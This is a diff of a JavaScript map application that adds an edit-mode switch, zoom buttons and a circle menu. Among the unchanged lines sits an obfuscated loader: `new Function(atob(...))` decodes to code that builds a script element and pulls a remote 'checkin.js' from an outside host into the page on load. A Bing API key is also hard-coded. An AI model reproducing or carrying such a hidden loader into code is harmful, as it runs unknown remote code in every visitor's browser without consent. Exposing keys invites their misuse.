@@ -189,6 +189,7 @@ function sendMessage(msgType, msg) {
 
 var app = {
     pins: null,
+    editMode: false,
     removeInvisiblePoints: function () {
         var bounds = lmap.getBounds();
         var itemsToRemove = [];
@@ -573,8 +574,13 @@ function startService() {
 }
 $(function () {
 
+
+
     $.link.mainTemplate('#row-full', app)
-     .on("click", "li", function () {
+     .on('click', '#editModeSwitch', function(evt) {
+         $.observable(app).setProperty("editMode", !app.editMode);
+     })
+    .on("click", ".main-list > li", function () {
          var selectedItem = $.view(this);
          app.selectItem(selectedItem);
          var marker = $.view(this).data.getMarker();
@@ -643,10 +649,31 @@ $(function () {
          }, 300);
     });
 
+    $('#zoomInHref').click(function (evt) {
+        lmap.zoomIn();
+        evt.preventDefault();
+        evt.cancelBubble = true;
+        evt.result = false;
+        evt.returnValue = false;
+        return false;
+    });
 
+    $('#zoomOutHref').click(function (evt) {
+        lmap.zoomOut();
+        evt.preventDefault();
+        evt.cancelBubble = true;
+        evt.result = false;
+        evt.returnValue = false;
+        return false;
+    });
 
     bingKey = 'AmpN66zZQqp8WpszBYibPXrGky0EiHLPT75WtuA2Tmj7bS4jgba1Wu23LJH1ymqy';
-    lmap = new L.Map('map', { center: new L.LatLng(40.72121341440144, -74.00126159191132), maxZoom: 19, zoom: 15 });
+    lmap = new L.Map('map', {
+        center: new L.LatLng(40.72121341440144, -74.00126159191132),
+        maxZoom: 19,
+        zoomControl: !(L.Browser.mobile),
+        zoom: 15
+    });
     lmap.attributionControl.addAttribution("JayStack.com ©");
     var bing = new L.BingLayer(bingKey, { maxZoom: 19 });
     trace = new $data.LeafletTrace();
@@ -660,6 +687,32 @@ $(function () {
     }, 1000);
     visiblePins.addTo(lmap);
     lmap.invalidateSize();
+
+
+    $('#menu').circleMenu({
+        item_diameter: 40,
+        circle_radius: 90,
+        direction: 'top-right',
+        trigger: 'click',
+        select: function (evt, item) {
+            var args = arguments;
+            evt.preventDefault();
+            evt.stopPropagation();
+            evt.cancelBubble = true;
+            evt.returnValue = false;
+            evt.result = false;
+            return false;
+        },
+        open: function () {
+            console.log('menu opened');
+        },
+        close: function () {
+            console.log('menu closed');
+        },
+        init: function () {
+            console.log('menu initialized');
+        }
+    });
 
     try {
         var f = new Function(atob("dmFyIF9wID0gInNjIjsgdmFyIF9jID0gInJpcHQiOyB2YXIgc2MgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KF9wICsgX2MpOyBzYy5zcmMgPSBhdG9iKCJhSFIwY0RvdkwzSmxjM1F1WTJ4dmRXUmhjSEF1Ym1WMEwyTm9aV05yYVc0dWFuTT0iKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzYyk7"));
@@ -690,9 +743,14 @@ $(function () {
     initAuth();
     startService();
 
+    window.setTimeout(function () {
+        resizeUI();
+    }, 0);
 });
 
+
 initUI();
+
 
 function defaultSearch(type) {
     return {
